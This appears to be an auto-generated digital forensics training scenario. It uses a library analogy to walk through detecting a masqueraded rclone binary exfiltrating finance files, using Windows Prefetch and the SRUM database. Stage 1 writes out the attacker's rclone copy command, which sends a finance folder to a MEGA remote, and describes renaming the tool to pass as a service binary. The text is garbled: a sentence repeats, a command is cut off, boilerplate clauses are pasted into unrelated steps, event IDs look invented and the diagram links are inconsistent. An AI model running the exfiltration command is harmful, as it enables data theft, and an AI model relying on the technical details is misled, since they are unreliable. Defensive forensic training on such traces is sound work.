scenario.name: NIST SP 800-86 & SANS DFIR — Windows Prefetch (MAM .pf) & SRUM (SRUDB.dat) Execution & Exfiltration Trace
scenario.overview: Imagine a quiet city public library with towering mahogany bookshelves packed with colorful books, green banker lamps on reading tables, a checkout desk, and a locked rare-book cage. Inside the calm public library reading hall, a visitor pulls an index card from the wooden catalog drawer and alters the shelf call-number to point into the staff archive. In this real-world scenario, the intruder smuggles copied records out past the library check-out desk in tiny disguised batches, then smuggles copied records out past the library check-out desk in tiny disguised batches. When the head librarian audits the evening circulation ledger, a restricted rare-book call number checked out on a regular visitor card immediately raises the alarm. On a Windows endpoint (MITRE T1041 exfiltration over the network), an attacker renames a data-sync tool to look like a service binary, runs it over HTTPS, then deletes the file hoping disk and logs forget the run. Windows still records the masqueraded execution in Prefetch and logs outbound volume in the SRUM network usage database. Steps #1 capture SysMain tracing of the renamed binary launch, Step #2 mines Prefetch run counts, timestamps, and referenced paths with PECmd, and Step #3 attributes bytes sent and process identity in SRUDB.dat. Primary detection pivots on Prefetch entries whose referenced paths no longer exist paired with SRUM spikes from a non-standard AppId.

stages.title: Stage 1: Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace
stages.subtitle: Defense Evasion (T1036.005 - Masquerading: Match Legitimate Name or Location)
stages.description: Inside the calm public library reading hall, a visitor pulls an index card from the wooden catalog drawer and alters the shelf call-number to point into the staff archive. Specifically in Step 1, the intruder smuggles copied records out past the library check-out desk in tiny disguised batches while everyday visitors and the head librarian go about their routine. The attacker renames rclone.exe to C:\ProgramData\svchost_upd.exe and runs svchost_upd.exe copy C:\Finance mega:exfil. For the first 10 seconds of process execution, the Windows kernel memory manager and SysMain (Superfetch) service monitor every DLL, configuration file, and directory touched by the process (logged in Sysmon Event 11 with PrefetchFile=C:\Windows\Prefetch\SVCHOST_UPD.EXE-9A41C20F.pf, CompressionHeader=MAM\x04 , LZXPRESS Huffman Win10/11, TracedExecutable=C:\ProgramData\svchost_upd.exe so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes C:\ProgramData\svchost_upd.exe copy C:\Finance\Q4_M_and_A mega:exfil_bucket --config C:\ProgramData\rclone.conf (which executes the technical command / telemetry directive , C:\ProgramData\svchost_upd.exe copy C:\Finance\Q4_M_and_A mega:exfil_bucket --config C:\Prog so that advances the scenario kill-chain under MITRE T1036.005 during "Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace" , The attacker renames rclone while generating verifiable host or network telemetry for DFIR attribution). Next, the follow-up artifact SysMain Service writes compressed MAM (0x04 0x4D 0x41 0x4D) Prefetch file after 10s trace window runs (which Extracts and parses persistent Windows execution artifacts from HKLM\SYSTEM AppCompatCache , ShimCache, C:\Windows\AppCompat\Programs\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1036.005 during "Masqueraded Exfiltration Binary Execution & SysMain Prefetcher Trace" even after the attacker deletes the malware executable from disk). On the diagram, follow Step #1 / Link #1 (#1→ svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain (Writing SVCHOST_UPD.EXE-9A41C20F.pf) / ⇠#1 ACK 11) from Node ① (#1 Masqueraded rclone (svchost_upd)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 SRUDB.dat (ESE Network Usage)).

stages.title: Stage 2: Prefetch (.pf) Run Count, Last 8 Execution Timestamps & Referenced File Handles (PECmd)
stages.subtitle: Collection (T1005 - Data from Local System Proved via Prefetch File Metrics)
stages.description: Handing that altered slip to the desk clerk under the warm green reading lamps, the visitor gets waved straight past the counter into the restricted rare-book cage. Here in Step 2 inside the public library, the intruder smuggles copied records out past the library check-out desk in tiny disguised batches without disturbing the general fiction reading tables. Decompressing and parsing SVCHOST_UPD.EXE-9A41C20F.pf with PECmd.exe reveals RunCount=2, the last 8 execution timestamps in UTC, Volume serial numbers, and the complete list of files opened during startup, including C:\ProgramData\rclone.conf and C:\Finance\Q4_M_and_A\Merger_Terms.xlsx, proving the masqueraded binary was actually Rclone reading sensitive files (logged in WinEvent Event 30 with ArtifactPath=C:\Windows\Prefetch\SVCHOST_UPD.EXE-9A41C20F.pf, RunCount=2, LastRunUtc=2026-11-03 01:11:54, SmokingGunReference=C:\PROGRAMDATA\RCLONE.CONF & MERGER_TERMS.XLSX so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes PECmd.exe -f "C:\Windows\Prefetch\SVCHOST_UPD.EXE-9A41C20F.pf" --csv C:\Forensics (which Extracts and parses persistent Windows execution artifacts from HKLM\SYSTEM AppCompatCache , ShimCache, C:\Windows\AppCompat\Programs\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1005 during "Prefetch .pf Run Count, Last 8 Execution Timestamps & Referenced File Handles , PECmd" even after the attacker deletes the malware executable from disk). Next, the follow-up artifact Prefetch Version: 30 (Win10/11) | RunCount: 2 | LastRun: 2026-11-03 01:11:54 UTC runs (which Extracts and parses persistent Windows execution artifacts from HKLM\SYSTEM AppCompatCache , ShimCache, C:\Windows\AppCompat\Programs\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1005 during "Prefetch .pf Run Count, Last 8 Execution Timestamps & Referenced File Handles , PECmd" even after the attacker deletes the malware executable from disk). On the diagram, follow Step #2 / Link #2 (#2→ PECmd.exe -f C:\Windows\Prefetch\SVCHOST_UPD.EXE-9A41C20F.pf / ⇠#2 ACK 30) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 SysMain / Prefetcher Engine), monitored by Node ⑥ (#6 SRUDB.dat (ESE Network Usage)).

stages.title: Stage 3: SRUM Database (SRUDB.dat) Network Data Usage Attribution ({973F5D5C-1D90-4944-BE8E-24B94231A174})
stages.subtitle: Exfiltration (T1041 - Exfiltration Over C2 Channel Quantified via SRUM)
stages.description: Hidden behind the tall mahogany bookshelves, the intruder photographs rare ledger volumes that were never meant to leave the locked archive room. In this final step inside the public library, the intruder smuggles copied records out past the library check-out desk in tiny disguised batches until the library circulation audit ledger catches the mismatch. To quantify the exact volume of data exfiltrated even after the binary was deleted and firewall logs rolled over, the analyst parses C:\Windows\System32\sru\SRUDB.dat (cross-referenced with the SOFTWARE hive for SruDbIdMapTable SIDs) using SrumECmd.exe. Table {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage Monitor) proves \Device\HarddiskVolume3\ProgramData\svchost_upd.exe transmitted 1,482,910,208 BytesSent under User SID S-1-5-21-...-1104 (logged in WinEvent Event 973 with ForensicDatabase=C:\Windows\System32\sru\SRUDB.dat, SrumTableGuid={973F5D5C-1D90-4944-BE8E-24B94231A174} , Network Usage, TrackedProcess=\Device\HarddiskVolume3\ProgramData\svchost_upd.exe, ExfiltratedBytesSent=1,482,910,208 bytes , 1.48 GB so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes SrumECmd.exe -f "C:\Windows\System32\sru\SRUDB.dat" -r "C:\Windows\System32\config\SOFTWARE" --csv C:\Forensics (which Extracts and parses persistent Windows execution artifacts from HKLM\SYSTEM AppCompatCache , ShimCache, C:\Windows\AppCompat\Programs\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1041 during "SRUM Database , SRUDB.dat Network Data Usage Attribution , {973F5D5C-1D90-4944-BE8E-24B94231A174}" even after the attacker deletes the malware executable from disk). Next, the follow-up artifact SRUM Table GUID: {973F5D5C-1D90-4944-BE8E-24B94231A174} (Network Data Usage) runs (which Extracts and parses persistent Windows execution artifacts from HKLM\SYSTEM AppCompatCache , ShimCache, C:\Windows\AppCompat\Programs\Amcache.hve so that reconstructs historical binary execution, SHA-1 file hashes, run counts, last execution timestamps, and per-process network bytes sent , T1041 during "SRUM Database , SRUDB.dat Network Data Usage Attribution , {973F5D5C-1D90-4944-BE8E-24B94231A174}" even after the attacker deletes the malware executable from disk). On the diagram, follow Step #3 / Link #3 (#3→ SrumECmd.exe -f C:\Windows\System32\sru\SRUDB.dat -r C:\Windows\System32\config\SOFTWARE / ⇠#3 ACK 973) from Node ③ (#3 SysMain / Prefetcher Engine) to Node ④ (#4 Prefetch (*.pf MAM Compressed)), monitored by Node ⑥ (#6 SRUDB.dat (ESE Network Usage)).
